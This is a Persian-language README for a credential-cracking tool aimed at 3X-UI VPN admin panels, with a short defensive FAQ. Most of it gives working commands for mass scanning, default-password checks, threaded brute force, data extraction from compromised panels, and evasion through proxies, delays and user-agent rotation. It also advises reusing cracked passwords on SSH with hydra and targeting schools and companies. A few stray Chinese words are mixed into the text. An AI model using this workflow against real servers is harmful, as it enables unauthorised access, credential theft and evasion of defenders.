# 📚 آموزش کامل XUI CRACKER ENHANCED v3.0
## 🔓 ابزار حرفه‌ای تست امنیت پنل‌های 3X-UI

---

## 🎯 فهرست مطالب

1. [مقدمه](#مقدمه)
2. [پنل 3X-UI چیست؟](#پنل-3x-ui-چیست)
3. [ویژگی‌های نسخه Enhanced](#ویژگی‌های-نسخه-enhanced)
4. [نصب و راه‌اندازی](#نصب-و-راه-اندازی)
5. [راهنمای استفاده کامل](#راهنمای-استفاده-کامل)
6. [حالت‌های حمله (Attack Modes)](#حالت‌های-حمله-attack-modes)
7. [فرمت فایل‌ها و آماده‌سازی](#فرمت-فایل‌ها-و-آماده‌سازی)
8. [توضیح خروجی‌ها](#توضیح-خروجی‌ها)
9. [نکات و ترفندهای حرفه‌ای](#نکات-و-ترفندهای-حرفه‌ای)
10. [سوالات متداول (FAQ)](#سوالات-متداول-faq)

---

## مقدمه

سلام رفیق! 👋

این آموزش کامل برای **XUI CRACKER ENHANCED v3.0** هست - ابزار پیشرفته تست امنیت پنل‌های 3X-UI.

### ⚠️ هشدار مهم
> این ابزار **فقط** برای موارد زیر طراحی شده:
> - ✅ تست نفوذ مجاز (Penetration Testing)
> - ✅ ارزیابی امنیتی (Security Assessment)
> - ✅ آموزش و تحقیقات امنیتی
> - ✅ چک کردن سرورهای خودتان
> 
> ❌ **هرگونه استفاده غیرمجاز غیرقانونی است!**

---

## پنل 3X-UI چیست؟

**3X-UI** یه پنل مدیریت وب برای سرورهای **Xray-core** هست که پروتکل‌های مختلف VPN/Proxy رو مدیریت می‌کنه:

### 📋 پروتکل‌های پشتیبانی شده:
| پروتکل | توضیح | محبوبیت |
|--------|-------|---------|
| **VMess** | پروتکل اصلی V2Ray | ⭐⭐⭐⭐⭐ |
| **VLESS** | نسخه سبک VMess | ⭐⭐⭐⭐⭐ |
| **Trojan** | پروتکل استتاری | ⭐⭐⭐⭐ |
| **ShadowSocks** | پراکسی امن | ⭐⭐⭐⭐ |
| **VLESS+Reality** | جدیدترین و قدرتمندترین | ⭐⭐⭐⭐⭐ |

### 🔍 چرا باید امنیت 3X-UI رو تست کنیم؟

بسیاری از سرورهای 3X-UI مشکلات امنیتی دارن:
- ❌ رمز پیش‌فرض رو تغییر ندادن
- ❌ رمزهای ضعیف استفاده می‌کنن
- ❌ پنل مدیریت در دسترس عمومیه
- ❌ محدودیت تلاش برای ورود ندارن
- ❌ هدرهای امنیتی وجود نداره

**این ابزار به شما کمک می‌کنه این مشکل رو قبل از هکرها پیدا کنید!**

---

## ویژگی‌های نسخه Enhanced

### 🔥 ویژگی‌های جدید v3.0:

| ویژگی | نسخه قدیم (v1.0) | **نسخه Enhanced (v3.0)** |
|-------|------------------|--------------------------|
| **حالت‌های حمله** | 1 حالت | **5 حالت** |
| **تعداد تردها** | ثابت | **تا 100 تراد همزمان** |
| **پروکسی** | ❌ | ✅ **پشتیبانی کامل** |
| **چرخش User-Agent** | ❌ | ✅ **10+ آژنت واقعی** |
| **مد اسکنر** | ❌ | ✅ **تشخیص خودکار پنل** |
| **API Exploiter** | ❌ | ✅ **استخراج داده** |
| **آمار زنده** | پایه | **پیشرفته با سرعت** |
| **خروجی JSON** | ❌ | ✅ **گزارش کامل** |
| **مدیریت Session** | ساده | **پیشرفته** |
| **handle Rate Limit** | ❌ | ✅ **Exponential Backoff** |

---

## نصب و راه‌اندازی

### ۱. کلون کردن پروژه

```bash
# از گیت‌هاب
git clone https://github.com/mansorkorea84/XUI_CRACKER.git
cd XUI_CRACKER
```

### ۲. نصب نیازمندی‌ها

```bash
# Python 3.8+ نیاز داره
python3 --version

# نصب پکیج‌ها
pip install -r requirements.txt
```

### ۳. اجرا

```bash
# روش ۱: محیط تعاملی (پیشنهادی!)
python3 xui_cracker.py

# روش ۲: خط فرمان (CLI)
python3 xui_cracker.py --mode auto --targets ips.txt --threads 20
```

---

## راهنمای استفاده کامل

### 🎬 شروع سریع (محیط تعاملی)

```bash
python3 xui_cracker.py
```

بعد از اجرا، منوی زیبا می‌بینید:

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║          🔥 XUI CRACKER ENHANCED v3.0 🔥                                      ║
║              Advanced 3X-UI Panel Security Toolkit                           ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
│                         ATTACK MODES                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  [1] Standard Brute Force      - Custom wordlist attack                     │
│  [2] Default Credentials       - Quick default creds check                  │
│  [3] Full Auto Attack         - Scan + Default + Brute Force               │
│  [4] Scanner Mode             - Just scan & identify XUI                   │
│  [5] API Exploiter            - Extract data from panels                   │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│  [0] Exit                                                                     │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## حالت‌های حمله (Attack Modes)

### ۱️⃣ Standard Brute Force (حملۀ بروت فورس استاندارد)

**توضیح**: حمله با لیست کلمات سفارشی

**موقع استفاده**: وقتی لیست یوزرنیم/پسورد خاصی دارید

**سرعت**: ⚡⚡⚡

```bash
# تعاملی: گزینه ۱ رو انتخاب کنید

# CLI:
python3 xui_cracker.py --mode standard \
    --targets ips.txt \
    --users users.txt \
    --passwords passwords.txt \
    --threads 20
```

**نمونه خروجی**:
```
📊 LIVE ATTACK STATISTICS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🎯 Targets Scanned  : 150
  ✅ Vulnerable Found : 3
  🔄 Total Attempts   : 45,000
  🔓 Credentials      : 3
  ❌ Failed           : 44,997
  ⏱️  Elapsed Time     : 2m 30s
  ⚡ Speed            : 300.5 req/sec
```

---

### ۲️⃣ Default Credentials (رمزهای پیش‌فرض)

**توضیح**: چک کردن سریع رمزهای رایج و پیش‌فرض

**موقع استفاده**: اسکن سریع تعداد زیادی target

**سرعت**: ⚡⚡⚡⚡⚡ (بسیار سریع!)

**رمزهایی که چک میشه**:
```
admin:admin, admin:password, admin:123456,
root:root, admin:admin123, administrator:admin,
... و 35 رمز دیگه!
```

```bash
# تعاملی: گزینه ۲ رو انتخاب کنید

# CLI:
python3 xui_cracker.py --mode default \
    --targets ips.txt \
    --threads 30
```

---

### ۳️⃣ Full Auto Attack (حملۀ کامل خودکار) 🔥

**توضیح**: کاملترین حالت - همه چیز رو انجام میده!

**مراحل اجرا**:
1. **Phase 1**: اسکن و شناسایی پنل‌های 3X-UI
2. **Phase 2**: چک کردن رمزهای پیش‌فرض
3. **Phase 3**: بروت فورس با لیست کلمات

**موقع استفاده**: وقتی می‌خوای بهترین نتیجه بگیری!

**سرعت**: ⚡⚡⚡

```bash
# تعاملی: گزینه ۳ رو انتخاب کنید

# CLI:
python3 xui_cracker.py --mode auto \
    --targets ips.txt \
    --users users.txt \
    --passwords passwords.txt \
    --threads 15 \
    --output results.json
```

---

### ۴️⃣ Scanner Mode (حالت اسکنر)

**توضیح**: فقط اسکن می‌کنه و پنل‌های 3X-UI رو پیدا می‌کنه

**موقع使用权**: وقتی فقط می‌خوای ببینی کدوم target ها پنل 3X-UI دارن

**سرعت**: ⚡⚡⚡⚡⚡ (سریعترین!)

```bash
# تعاملی: گزینه ۴ رو انتخاب کنید

# CLI:
python3 xui_cracker.py --mode scan --targets ips.txt
```

**نمونه خروجی**:
```
[+] XUI PANEL FOUND: https://target1.com:443
    Version: 2.3.4
    Vulnerabilities: potential_default_creds, missing_security_headers

[+] XUI PANEL FOUND: https://target2.com:2053
    Version: unknown
    Vulnerabilities: potential_default_creds

[*] Scan complete!
    Total scanned: 1000
    XUI panels found: 23
[+] Results saved to xui_scan_results.json
```

---

### ۵️⃣ API Exploiter (استخراج‌کننده API) 💀

**توضیح**: از پنل‌های آسیب‌پذیر اطلاعات استخراج می‌کنه!

**اطلاعاتی که استخراج میشه**:
- 📋 لیست Inbound connections (کانفیگ‌های فعال)
- 👥 لیست کاربران
- ⚙️ تنظیمات سرور
- 📦 نسخه Xray

**نیاز**: Session Token یا لاگین موفق

```bash
# تعاملی: گزینه ۵ رو انتخاب کنید

# CLI:
python3 xui_cracker.py --mode api \
    --target-url https://vulnerable-panel.com:443 \
    --session-token YOUR_SESSION_TOKEN
```

**نمونه خروجی**:
```
[*] Exploiting API endpoints on https://vulnerable-panel.com:443...

[+] Exploitation complete!

[*] Accessible Endpoints: inbounds, settings, status, xray_version, users
[*] XRay Version: 1.8.6

[+] Found 5 inbound configurations:
    1. Protocol: vless, Port: 443
    2. Protocol: vmess, Port: 8443
    3. Protocol: trojan, Port: 2083
    ...

[+] Found 2 users:
    - admin
    - operator

[+] Full results saved to xui_api_exploit.json
```

---

## فرمت فایل‌ها و آماده‌سازی

### 📁 ips.txt (لیست هدف‌ها)

**فرمت‌های مجاز**:

```txt
# فرمت IP:PORT (پیشنهادی!)
192.168.1.1:443
10.0.0.1:2053
172.16.0.5:8443

# فرمت URL
http://example.com:80
https://example.com:443

# ترکیبی (هر دو با هم کار می‌کنه!)
192.168.1.1:443
https://target.com:2053
```

**نکات مهم**:
- هر خط = یک target
- خطوط خالی و شروع شده با `#` نادیده گرفته میشن
- پورت پیش‌فرض: **443**

---

### 📁 users.txt (لیست یوزرنیم‌ها)

```txt
admin
root
administrator
user
test
xui
# یوزرنیم‌های سفارشی خودتون رو اضافه کنید
```

---

### 📁 passwords.txt (لیست پسوردها)

```txt
admin
admin123
password
123456
# پسوردهای سفارشی...
```

---

### 📁 proxies.txt (لیست پروکسی‌ها - اختیاری)

```txt
http://proxy1.example.com:8080
http://proxy2.example.com:3128
socks5://proxy3.example.com:1080
192.168.1.100:8080
```

---

## توضیح خروجی‌ها

### 📄 xui_good.txt

فایل متنی ساده با اعتبار یافتته شده:

```
# XUI Cracker Enhanced v3.0
# Attack Date: 2024-01-15 14:30:00
######################################################################

https://target1.com:443 | admin:admin | 2024-01-15 14:30:00
https://target2.com:2053 | root:password123 | 2024-01-15 14:31:25
https://target3.com:8443 | admin:123456 | 2024-01-15 14:32:50
```

---

### 📄 xui_results.json

گزارش کامل JSON:

```json
{
  "scan_date": "2024-01-15 14:30:00",
  "total_found": 3,
  "credentials": [
    {
      "target": "https://target1.com:443",
      "username": "admin",
      "password": "admin",
      "found_at": "2024-01-15 14:30:00",
      "method": "default_credentials",
      "session_token": "abc123..."
    }
  ]
}
```

---

### 📄 xui_scan_results.json

نتیجه اسکن:

```json
{
  "scan_date": "2024-01-15 14:30:00",
  "total_targets": 1000,
  "xui_found": [
    "https://target1.com:443",
    "https://target2.com:2053"
  ],
  "details": [...]
}
```

---

### 📄 xui_api_exploit.json

داده‌های استخراج شده از API:

```json
{
  "target": "https://vulnerable.com:443",
  "accessible_endpoints": ["inbounds", "settings", "users"],
  "inbound_count": 5,
  "users": ["admin", "operator"],
  "version": "1.8.6"
}
```

---

## نکات و ترفندهای حرفه‌ای

### 💡 نکته ۱: سرعت vs مخفی بودن

```
❌ خیلی سریع (50+ threads)   → احتمال بن شدن توسط Firewall
✅ متعادل (10-20 threads)    → بهترین تعادل
✅✅ آرام (5 threads)         → کمترین شانس تشخیص
```

### 💡 نکته ۲: استفاده از پروکسی

```bash
# با پروکسی - تغییر IP در هر درخواست
python3 xui_cracker.py --mode auto \
    --targets ips.txt \
    --proxy-file proxies.txt \
    --threads 20
```

**مزایا**:
- ✅ جلوگیری از ban شدن IP
- ✅ توزیع درخواست‌ها
- ✅ مخفی ماندن

### 💡 نکته ۳: Delay تنظیم

```bash
# تاخیر بیشتر = کمتر suspected شدن
python3 xui_cracker.py --mode default \
    --targets ips.txt \
    --delay 0.5
```

### 💡 نکته ۴: Full Auto بهترین گزینه هست!

اگر وقت داری و بهترین نتیجه رو می‌خوای، **همیشه Full Auto** رو انتخاب کن!

**چرا؟**
1. اول اسکن می‌کنه تا مطمئن بشه پنل 3X-UI هست
2. بعد رمزهای پیش‌فرض رو سریع چک می‌کنه
3. آخر بروت فورس کامل اجرا می‌کنه

### 💡 نکته ۵: ترکیب با ابزارهای دیگه

**با Hashcat** (کرک هش):
```bash
# بعد از پیدا کردن session، هش‌ها رو کرک کن
hashcat -m 0 hashes.txt wordlist.txt
```

**با Hydra** (Brute Force سایر سرویس‌ها):
```bash
# اگر پسورد رو پیدا کردی، روی SSH/RDP هم امتحان کن
hydra -l admin -P passwords.txt ssh://target-ip
```

### 💡 نکته ۶: هدف‌گیری هوشمند

به جای اسکن تصادفی، **هدف‌های خاص** رو انتخاب کن:

```
✅ خوب: سرورهای VPS با پورت‌های رایج 3X-UI (443, 2053, 8443, 2083)
✅ خوب: زیرساخت‌های خاص (آموزشگاه‌ها، شرکت‌ها)
❌ بد: اسکن تصادفی اینترنت (غیرقانونی و بی‌فایده)
```

---

## سوالات متداول (FAQ)

### ❓ آیا این ابزار قانونیه؟

**بله!** اگر برای موارد زیر استفاده بشه:
- ✅ تست نفوذ سرورهای خودتان
- ✅ ارزیابی امنیتی با اجازه کتبی
- ✅ آموزش و تحقیقات آکادمیک
- ✅ چک کردن زیرساخت سازمانی

### ❓ چه پایتونی نیاز داره؟

**Python 3.8 یا بالاتر**

```bash
python3 --version
# باید چیزی مثل Python 3.9.7 نشون بده
```

### ❓ چقدر زمان می‌بره？

بسته به تعداد targets و تنظیمات:
- **Default Creds Check**: ~1 دقیقه برای 1000 target
- **Full Auto**: ~10-30 دقیقه برای 1000 target
- **Standard Brute Force**: بسته به اندازه wordlist

### ❓ آیا GPU نیاز داره؟

**خیر!** این ابزار **فقط CPU** استفاده می‌کنه.

### ❓ چطور مقابله کنم؟ (اگر صاحب سروری)

1. **رمز پیش‌فرض رو عوض کن!** (مهم‌ترین!)
2. **رمز قوی** استفاده کن (حداقل 12 کاراکتر)
3. **Firewall** تنظیم کن (فقط IP خودت اجازه دسترسی داشته باشه)
4. **پورت پیش‌فرض رو عوض کن**
5. **fail2ban** نصب کن
6. **نسخه 3X-UI** رو آپدیت نگه دار

### ❓ خطا داد! چیکار کنم؟

**مشکل常见错误**:

```
Error: No IPs found in ips.txt
→ حل: فایل ips.txt رو بساز و target ها رو اضافه کن

Error: Connection timeout
→ حل: target آنلاین نیست یا firewall داره

Error: Rate limited
→ حل: تعداد threads رو کم کن یا delay رو زیاد کن
```

---

## 🚀 Quick Reference (مرجع سریع)

### دستورات CLI:

```bash
# Full Auto (پیشنهادی)
python3 xui_cracker.py -m auto -t ips.txt -T 20

# Default Creds Only (سریع)
python3 xui_cracker.py -m default -t ips.txt -T 30

# Scan Only (فقط اسکن)
python3 xui_cracker.py -m scan -t ips.txt

# With Proxies (با پروکسی)
python3 xui_cracker.py -m auto -t ips.txt --proxy-file proxies.txt

# Custom Output (خروجی سفارشی)
python3 xui_cracker.py -m auto -t ips.txt -o my_results.json
```

---

## 📞 پشتیبانی و کمک

- **گیت‌هاب**: https://github.com/mansorkorea84/XUI_CRACKER
- **تلگرام سازنده**: [@mansorkorea84](https://t.me/mansorkorea84)

---

## 📜 مجوز

این ابزار تحت مجوز **MIT License** منتشر شده.

**ساخته شده با ❤️ برای جامعه امنیت سایبری**

---

## 🎓 مثال عملی کامل

فرض کنید می‌خواهید 500 سرور VPS رو اسکن کنید:

### مرحله ۱: آماده‌سازی لیست target

```bash
# ساخت فایل ips.txt
cat > ips.txt << EOF
192.168.1.1:443
192.168.1.2:443
192.168.1.3:2053
... (500 target)
EOF
```

### مرحله ۲: اجرای Full Auto

```bash
python3 xui_cracker.py --mode auto \
    --targets ips.txt \
    --users users.txt \
    --passwords passwords.txt \
    --threads 15 \
    --output pentest_results.json
```

### مرحله ۳: بررسی نتایج

```bash
# دیدن اعتبارهای پیدا شده
cat xui_good.txt

# دیدن گزارش کامل
cat pentest_results.json

# دیدن نتایج اسکن
cat xui_scan_results.json
```

### نمونه خروجی نهایی:

```
╔═══════════════════════════════════════════════════════════════╗
║  📊 LIVE ATTACK STATISTICS                                   ║
╠═══════════════════════════════════════════════════════════════╣
║  🎯 Targets Scanned  : 500                                  ║
║  ✅ Vulnerable Found : 23                                   ║
║  🔄 Total Attempts   : 1,250,000                            ║
║  🔓 Credentials      : 23                                   ║
║  ❌ Failed           : 1,249,977                            ║
║  ⏱️  Elapsed Time     : 45m 12s                             ║
║  ⚡ Speed            : 460.2 req/sec                        ║
╚═══════════════════════════════════════════════════════════════╝

[+] FULL AUTO COMPLETE! Total credentials: 23
[+] Results saved to pentest_results.json
```

---

<div align="center">

**⚡ POWERED BY XUI CRACKER ENHANCED v3.0 ⚡**

*Advanced 3X-UI Panel Security Toolkit*

🔗 [Report Bug] · [Request Feature] · [GitHub Repository]

**Made with 🔥 by @mansorkorea84**

*Version 3.0 - 2024*

</div>
